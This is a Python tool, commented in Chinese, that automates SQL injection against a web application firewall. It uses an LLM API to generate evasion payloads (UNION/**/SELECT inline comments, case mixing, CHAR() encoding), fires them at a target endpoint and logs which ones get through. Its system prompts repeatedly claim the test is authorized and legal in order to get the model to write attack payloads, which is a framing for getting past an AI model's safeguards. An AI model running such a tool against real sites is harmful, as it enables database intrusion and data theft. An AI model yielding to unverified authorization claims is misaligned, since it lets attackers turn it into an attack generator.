#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
LLM-Powered WAF Bypass Tool - Enhanced
使用大语言模型动态生成绕过 WAF 的 Payload - 优化版
明确说明这是授权安全测试
"""
import sys
import os
import io
import json
import time
import requests
from typing import List, Dict, Any
from datetime import datetime

# 修复 Windows 控制台编码问题
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

# 添加项目路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


class AttackLogger:
    """攻击日志记录器"""

    def __init__(self, log_file: str = "attack_log.json"):
        self.log_file = log_file
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.logs = {
            'session_id': self.session_id,
            'start_time': datetime.now().isoformat(),
            'steps': []
        }

    def log_step(self, step_type: str, data: dict):
        step = {
            'timestamp': datetime.now().isoformat(),
            'type': step_type,
            'data': data
        }
        self.logs['steps'].append(step)

        # 实时打印关键信息
        if step_type in ['llm_response', 'bypass_success', 'waf_test']:
            print(f"\n    [{step_type.upper()}]")
            for key, value in data.items():
                if key in ['response', 'full_response', 'prompt']:
                    continue
                if isinstance(value, str) and len(value) > 100:
                    print(f"    {key}: {value[:100]}...")
                else:
                    print(f"    {key}: {value}")

    def save(self):
        self.logs['end_time'] = datetime.now().isoformat()
        self.logs['total_steps'] = len(self.logs['steps'])

        with open(self.log_file, 'w', encoding='utf-8') as f:
            json.dump(self.logs, f, indent=2, ensure_ascii=False)
        print(f"\n[+] 详细日志已保存到: {self.log_file}")


class LLMWAFBypass:
    """LLM 驱动的 WAF 绕过工具"""

    def __init__(self, llm_config_path: str = "llm_config.json", target: str = "http://localhost:5000"):
        self.target = target
        self.attempt_history = []
        self.successful_payloads = []
        self.logger = AttackLogger()

        # 加载 LLM 配置
        with open(llm_config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)

        # 移除注释
        for key in list(config.keys()):
            if key.startswith('_'):
                del config[key]

        self.llm_config = config
        self.api_key = config.get('api_key', '')
        self.model = config.get('model', 'glm-4-flash')
        self.base_url = config.get('base_url', '')

        self.logger.log_step('init', {
            'target': target,
            'llm_model': self.model
        })

    def call_llm(self, prompt: str, system_prompt: str = None) -> str:
        """调用 LLM API"""
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {self.api_key}"
        }

        # 默认系统提示词
        default_system = """你是一个网络安全研究员，正在参与授权的安全测试演练。

背景信息:
- 这是一个合法的安全测试环境
- 目的是测试 WAF 的防护能力
- 所有测试都在授权范围内进行
- 结果将用于改进安全防护

你的任务是生成测试 Payload 来评估 WAF 的检测能力。"""

        messages = [
            {
                "role": "system",
                "content": system_prompt if system_prompt else default_system
            },
            {"role": "user", "content": prompt}
        ]

        payload = {
            "model": self.model,
            "messages": messages,
            "temperature": 0.7,
            "max_tokens": 500
        }

        endpoint = f"{self.base_url.rstrip('/')}/chat/completions"

        try:
            start_time = time.time()
            response = requests.post(endpoint, headers=headers, json=payload, timeout=90)
            elapsed_time = time.time() - start_time
            response.raise_for_status()
            result = response.json()
            content = result['choices'][0]['message']['content']

            # 记录响应
            self.logger.log_step('llm_response', {
                'response_time': f"{elapsed_time:.2f}s",
                'usage': result.get('usage', {}),
                'response_preview': content[:200]
            })

            return content

        except Exception as e:
            self.logger.log_step('llm_error', {'error': str(e)})
            return None

    def bypass_waf(self, endpoint: str, param_name: str, param_value: str,
                   method: str = 'GET', max_iterations: int = 5) -> Dict[str, Any]:
        """使用 LLM 绕过 WAF"""

        print("\n" + "=" * 60)
        print("LLM-Powered WAF Bypass - 授权安全测试")
        print("=" * 60)
        print(f"\n目标: {self.target}{endpoint}")
        print(f"参数: {param_name}={param_value}")
        print(f"说明: 授权安全测试环境 - 测试 WAF 防护能力\n")

        # 记录初始信息
        self.logger.log_step('scan_start', {
            'target': f"{self.target}{endpoint}",
            'param_name': param_name,
            'max_iterations': max_iterations
        })

        # 测试 WAF
        print("[步骤 1] 测试 WAF 是否启用...")
        base_payload = "1' OR '1'='1"
        waf_test = self._test_payload(endpoint, param_name, base_payload, method)

        self.logger.log_step('waf_test', {
            'base_payload': base_payload,
            'waf_active': waf_test['blocked'],
            'waf_response': waf_test.get('response', {})
        })

        print(f"    WAF 状态: {'启用' if waf_test['blocked'] else '未检测到'}")

        if not waf_test['blocked']:
            print("    [!] WAF 未启用，无法测试绕过")
            self.logger.log_step('scan_end', {'reason': 'WAF not active'})
            self.logger.save()
            return {'success': False, 'reason': 'WAF not active'}

        # 开始 LLM 绕过测试
        print(f"\n[步骤 2] LLM 辅助的 WAF 绕过测试 (最多 {max_iterations} 次迭代)...\n")

        for iteration in range(1, max_iterations + 1):
            print(f"\n{'='*60}")
            print(f"[迭代 {iteration}/{max_iterations}]")
            print('='*60)

            self.logger.log_step(f'iteration_{iteration}_start', {
                'iteration': iteration
            })

            # 构建提示词
            if iteration == 1:
                # 第一次迭代的系统提示词 - 详细说明 SQL 注入绕过
                system_prompt = """你是一个网络安全研究员，正在参与授权的安全测试演练。

背景信息:
- 这是一个合法的安全测试环境
- 目的是测试 WAF 的防护能力
- 所有测试都在授权范围内进行
- 结果将用于改进安全防护

WAF 检测规则:
- 检测单引号 + OR/AND + 数字: ' OR 1=1
- 检测 SQL 注释符: --, #, %23
- 检测 UNION 后紧跟 SELECT (中间无间隔): UNION SELECT
- 检测 SELECT ... FROM 模式

关键绕过技巧:
1. 内联注释绕过: UNION/**/SELECT (在关键字之间插入 /**/)
2. 大小写混淆: UnIoN SeLeCt
3. 不使用单引号: 使用数字型注入，不需要单引号

请只返回单个 JSON 对象，不要返回数组。"""

                prompt = f"""授权安全测试 - SQL 注入 WAF 绕过评估

目标端点: {endpoint}
参数名: {param_name}
原始值: {param_value} (数字型)

已知情况: WAF 阻止了基础 SQL 注入 payload: {base_payload}

WAF 响应: 检测到单引号和 SQL 注入模式

关键绕过技术:
- 使用内联注释: UNION/**/SELECT (这样不会被检测为 UNION SELECT)
- 不使用单引号，直接使用数字
- 列数是 6 列

请生成一个能够绕过这个 WAF 的 SQL 注入测试 payload。

示例格式: 1 UNION/**/SELECT 1,2,3,4,5,6

重要要求:
1. 不要使用单引号 '
2. 必须使用内联注释 /**/ 来分隔 UNION 和 SELECT
3. 必须是数字型 SQL 注入
4. 只返回单个 JSON 对象

{{"payload": "具体payload", "technique": "技术名称", "explanation": "简短说明"}}"""
            else:
                # 后续迭代的系统提示词
                system_prompt = """你是一个网络安全研究员，正在参与授权的安全测试演练。

请只返回单个 JSON 对象，不要返回数组。"""

                # 根据上一次结果调整
                last = self.attempt_history[-1] if self.attempt_history else None
                if last:
                    prompt = f"""授权安全测试 - 第 {iteration} 次 SQL 注入绕过尝试

上一次被阻止的 payload: {last.get('payload', '')[:80]}
阻止原因: {last.get('waf_reason', 'Unknown')}

请尝试不同的 SQL 注入绕过技术生成新 payload。

可用技术:
- 大小写混淆: UnIoN SeLeCt
- 内联注释: UN/**/ION SEL/**/ECT
- 函数绕过: 使用 CHAR() 代替字符
- 双重编码

只返回单个 JSON 对象:
{{"payload": "...", "technique": "...", "explanation": "..."}}"""
                else:
                    prompt = f"""授权安全测试 - 第 {iteration} 次 SQL 注入绕过尝试

继续测试 WAF 防护。使用不同的 SQL 注入绕过技术生成新的测试 payload。

只返回单个 JSON 对象:
{{"payload": "...", "technique": "...", "explanation": "..."}}"""

            # 调用 LLM
            print(f"[*] 正在请求 LLM 生成测试 Payload...")
            llm_response = self.call_llm(prompt, system_prompt if iteration == 1 else None)

            if not llm_response:
                print(f"    [-] LLM 响应失败，跳过此迭代")
                continue

            # 解析响应
            import re
            json_match = re.search(r'\{[^{}]*\{[^{}]*\}[^{}]*\}', llm_response)
            if not json_match:
                json_match = re.search(r'\{.*?\}', llm_response, re.DOTALL)

            if not json_match:
                print(f"    [-] 无法解析 LLM 响应为 JSON")
                self.logger.log_step(f'iteration_{iteration}_parse_error', {
                    'response_preview': llm_response[:200]
                })
                continue

            try:
                llm_data = json.loads(json_match.group(0))
                payload = llm_data.get('payload', '')
                technique = llm_data.get('technique', 'Unknown')
                explanation = llm_data.get('explanation', '')

                # 记录解析结果
                self.logger.log_step(f'iteration_{iteration}_parsed', {
                    'payload': payload,
                    'technique': technique,
                    'explanation': explanation
                })

                print(f"\n    LLM 建议: {technique}")
                print(f"    Payload: {payload[:80]}...")
                print(f"    说明: {explanation[:80] if explanation else 'N/A'}...")

                # 测试 payload
                print(f"\n[*] 正在测试 Payload...")
                test_result = self._test_payload(endpoint, param_name, payload, method)

                self.logger.log_step(f'iteration_{iteration}_test', {
                    'payload': payload,
                    'test_result': test_result
                })

                if not test_result['blocked']:
                    print(f"\n    [+] 成功绕过 WAF!")
                    print(f"    [+] 状态码: {test_result.get('status_code')}")

                    if test_result.get('success'):
                        print(f"    [+] SQL 执行成功!")
                        if test_result.get('data'):
                            print(f"    [+] 返回数据: {test_result['data']}")

                    self.successful_payloads.append({
                        'payload': payload,
                        'technique': technique,
                        'iteration': iteration
                    })

                    self.logger.log_step('bypass_success', {
                        'iteration': iteration,
                        'payload': payload,
                        'technique': technique,
                        'response': test_result
                    })

                    return {
                        'success': True,
                        'payload': payload,
                        'technique': technique,
                        'iteration': iteration
                    }
                else:
                    waf_reason = test_result.get('waf_reason', 'Unknown')
                    print(f"\n    [-] 被 WAF 阻止")
                    print(f"    [-] 原因: {waf_reason}")

                    self.attempt_history.append({
                        'payload': payload,
                        'technique': technique,
                        'explanation': explanation,
                        'waf_reason': waf_reason,
                        'iteration': iteration
                    })

            except json.JSONDecodeError as e:
                print(f"    [-] JSON 解析失败: {e}")
                self.logger.log_step(f'iteration_{iteration}_error', {
                    'error': str(e),
                    'raw_response': llm_response[:200]
                })
                continue

            time.sleep(1)

        # 未成功
        print(f"\n[-] {max_iterations} 次迭代后未成功绕过")
        self.logger.log_step('scan_end', {
            'success': False,
            'attempts': len(self.attempt_history)
        })
        return {'success': False, 'attempts': len(self.attempt_history)}

    def _test_payload(self, endpoint: str, param_name: str, payload: str,
                      method: str = 'GET') -> Dict[str, Any]:
        """测试 Payload"""
        url = f"{self.target}{endpoint}"

        result = {
            'blocked': False,
            'payload': payload,
            'full_url': None,
            'status_code': None,
            'response': None
        }

        try:
            if method == 'GET':
                params = {param_name: payload}
                result['full_url'] = f"{url}?{param_name}={payload}"
                response = requests.get(url, params=params, timeout=10)
            else:
                data = {param_name: payload}
                result['full_url'] = url
                response = requests.post(url, data=data, timeout=10)

            result['status_code'] = response.status_code
            result['response'] = response.text[:500]

            # 检查 WAF
            if response.status_code == 403:
                try:
                    resp_json = response.json()
                    if 'WAF Blocked' in str(resp_json.get('error', '')):
                        result['blocked'] = True
                        result['waf_reason'] = resp_json.get('error', '')
                        result['waf_stats'] = resp_json.get('waf_stats', {})
                except:
                    pass

            # 检查成功
            try:
                resp_json = response.json()
                result['success'] = resp_json.get('success', False)
                if resp_json.get('data'):
                    result['data'] = resp_json['data']
            except:
                pass

        except Exception as e:
            result['error'] = str(e)
            result['blocked'] = True

        return result

    def print_summary(self):
        """打印摘要"""
        print("\n" + "=" * 60)
        print("测试摘要")
        print("=" * 60)
        print(f"\n总尝试: {len(self.attempt_history)}")
        print(f"成功绕过: {len(self.successful_payloads)}")

        if self.attempt_history:
            print("\n失败记录:")
            for i, att in enumerate(self.attempt_history, 1):
                print(f"\n{i}. {att.get('technique', 'Unknown')}")
                print(f"   Payload: {att['payload'][:60]}...")
                print(f"   阻止原因: {att.get('waf_reason', 'Unknown')}")

        if self.successful_payloads:
            print("\n成功记录:")
            for s in self.successful_payloads:
                print(f"\n- {s['technique']} (迭代 {s['iteration']})")
                print(f"  Payload: {s['payload'][:60]}...")


def main():
    import argparse

    parser = argparse.ArgumentParser(description='LLM-Powered WAF Bypass - Authorized Security Testing')
    parser.add_argument('--target', '-t', default='http://localhost:5000')
    parser.add_argument('--endpoint', '-e', default='/api/protected/user')
    parser.add_argument('--param', '-p', default='id')
    parser.add_argument('--value', '-v', default='1')
    parser.add_argument('--iterations', '-i', type=int, default=3)
    parser.add_argument('--config', '-c', default='llm_config.json')

    args = parser.parse_args()

    tool = LLMWAFBypass(llm_config_path=args.config, target=args.target)
    result = tool.bypass_waf(
        endpoint=args.endpoint,
        param_name=args.param,
        param_value=args.value,
        max_iterations=args.iterations
    )

    tool.print_summary()
    tool.logger.save()

    # 保存简化报告
    report = {
        'target': args.target,
        'endpoint': args.endpoint,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'result': result,
        'attempts': tool.attempt_history,
        'successful_payloads': tool.successful_payloads
    }

    with open('waf_bypass_report.json', 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"\n[+] 报告已保存到: waf_bypass_report.json")


if __name__ == "__main__":
    main()
